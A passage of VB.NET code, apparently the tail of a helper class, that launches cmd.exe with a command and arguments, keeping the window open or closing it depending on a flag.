        Dim pi As ProcessStartInfo = New ProcessStartInfo()
        pi.Arguments = " " + If(permanent = True, "/K", "/C") + " " + command + " " + arguments
        pi.FileName = "cmd.exe"
        p.StartInfo = pi
        p.Start()
    End Sub


End Class
